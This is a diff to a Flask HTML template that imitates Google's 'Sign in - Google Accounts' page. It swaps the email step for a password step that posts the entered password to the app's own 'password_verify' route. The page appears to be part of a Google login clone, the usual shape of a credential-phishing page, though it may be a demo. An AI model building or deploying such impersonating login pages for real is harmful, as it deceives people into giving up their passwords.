@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/auth.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/auth_pass.css') }}">
 </head>
 <body>
     <div class="container">
@@ -15,33 +15,32 @@
             </div>
 
             <!-- Sign in text -->
-            <h1>Sign in</h1>
-            <p class="subtext">Use your Google Account</p>
+            <h1>Welcome</h1>
+            <p class="subtext">Sign in to continue</p>
 
-            <!-- Display error message if email is not recognized -->
+            <!-- Display the user's email -->
+            <p class="user-email">{{ email }}</p>
+
+            <!-- Display error message if password is incorrect -->
             {% if error %}
             <div class="error-message">
-                <p>The email you entered is not recognized. Please try again or create an account.</p>
+                <p>The password you entered is incorrect. Please try again.</p>
             </div>
             {% endif %}
 
-            <!-- Email input form -->
-            <form action="{{ url_for('google_signin') }}" method="POST">
+            <!-- Password input form -->
+            <form action="{{ url_for('password_verify', email=email) }}" method="POST">
                 <div class="input-field">
-                    <input type="text" name="email" placeholder="Email or phone" required>
-                </div>
-                <div class="forgot-email">
-                    <a href="https://accounts.google.com/signin/v2/usernamerecovery">Forgot email?</a>
+                    <input type="password" name="password" placeholder="Enter your password" required>
                 </div>
 
-                <!-- Help text -->
-                <p class="help-text">
-                    Login using email in this format: <a href="#">user_xx@gmail.com</a>
-                </p>
+                <!-- Forgot password link -->
+                <div class="forgot-email">
+                    <a href="{{ url_for('login') }}">Back to Login</a>
+                </div>
 
                 <!-- Buttons -->
                 <div class="actions">
-                    <a href="{{ url_for('register') }}" class="create-account">Create account</a>
                     <button type="submit" class="next-button">Next</button>
                 </div>                
             </form>
